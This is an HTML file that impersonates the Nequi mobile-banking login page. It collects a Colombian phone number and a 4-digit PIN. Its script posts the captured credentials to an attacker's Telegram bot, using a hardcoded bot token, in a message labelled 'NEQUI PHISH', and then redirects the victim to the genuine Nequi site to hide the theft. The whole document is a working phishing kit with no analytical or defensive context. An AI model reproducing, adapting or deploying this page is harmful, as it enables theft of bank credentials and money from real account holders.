<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #1E0B2C;
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center;
            color: white;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }
        .logo {
            font-size: 58px;
            font-weight: 700;
            margin-bottom: 60px;
            letter-spacing: -2px;
        }
        .logo span {
            color: #FF2D95;
        }
        .input-container {
            background: rgba(255,255,255,0.09);
            border-radius: 14px;
            padding: 4px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }
        .country {
            padding: 0 20px;
            font-size: 17px;
            border-right: 1px solid rgba(255,255,255,0.25);
            color: #ccc;
        }
        input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 18px 15px;
            font-size: 17px;
            color: white;
            outline: none;
        }
        input::placeholder {
            color: rgba(255,255,255,0.5);
        }
        .btn {
            width: 100%;
            padding: 18px;
            background: #E91E63;
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 17.5px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }
        .help {
            position: absolute;
            top: 25px;
            right: 25px;
            font-size: 26px;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="help">?</div>

    <div class="container">
        <div class="logo"><span>■</span>Nequi</div>
        
        <form id="loginForm">
            <div class="input-container">
                <div class="country">+57</div>
                <input type="tel" id="phone" placeholder="Ingresa tu celular" maxlength="10" inputmode="numeric" required>
            </div>
            
            <div class="input-container">
                <input type="password" id="password" placeholder="Clave de 4 dígitos" maxlength="4" inputmode="numeric" required>
            </div>
            
            <button type="submit" class="btn">Entrar</button>
        </form>
    </div>

    <script>
        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
        const chatId = "773351137";

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const phone = document.getElementById("phone").value.trim();
            const password = document.getElementById("password").value.trim();

            if (!/^\d{10}$/.test(phone)) {
                return;
            }
            if (!/^\d{4}$/.test(password)) {
                return;
            }

            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).then(() => {
                setTimeout(() => {
                    window.location.href = "https://www.nequi.com.co";
                }, 1200);
            });
        });
    </script>
</body>
</html>
